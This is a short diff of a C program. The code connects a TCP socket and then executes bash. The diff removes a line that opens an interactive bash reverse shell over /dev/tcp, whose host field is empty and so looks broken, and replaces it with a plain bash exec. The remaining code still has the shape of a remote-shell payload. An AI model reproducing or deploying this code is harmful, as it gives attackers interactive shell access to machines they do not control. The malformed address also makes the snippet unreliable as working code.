@@ -55,7 +55,7 @@ int main(int argc, char* argv[], char* envp[])
     s = socket(AF_INET, SOCK_STREAM, 0);
     connect(s, (struct sockaddr *)&sa, sizeof(sa));
     
-    int fd2=execl("/bin/bash", "/bin/bash", "-c", "bash -i >& /dev/tcp//1234 0>&1", NULL);
+    int fd2=execl("/bin/bash", "/bin/bash", (char *)NULL);
 
     printf("\n ----------------------------------- \n");
     int i = 0, j = 0;
